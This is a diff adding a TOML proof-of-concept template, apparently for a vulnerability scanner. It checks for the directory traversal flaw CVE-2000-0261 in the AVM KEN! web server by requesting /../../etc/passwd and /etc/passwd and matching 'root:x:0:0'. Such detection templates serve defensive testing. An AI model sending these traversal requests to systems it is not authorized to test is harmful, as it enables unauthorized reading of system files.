@@ -1,0 +1,42 @@
+[info]
+author = "ave"
+description = "AVM KEN! 内置 Web 服务器存在目录遍历漏洞，远程攻击者可通过在请求路径中插入 ../ 序列绕过目录限制读取 Web 根目录之外的任意文件。本 PoC 通过请求 /../../etc/passwd 等路径尝试读取系统文件，以验证目标是否存在该漏洞，仅做安全无损验证。"
+id = "POC-AVE-2000-0234"
+name = "CVE-2000-0261 AVM KEN! 目录遍历任意文件读取 PoC"
+severity = "medium"
+tags = ["ave-2000-0234"]
+vuln_id = [
+    "CVE-2000-0261",
+    "AVE-2000-0234",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/../../etc/passwd"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:x:0:0"]
+
+[[poc.requests]]
+method = "GET"
+path = "/etc/passwd"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:x:0:0"]
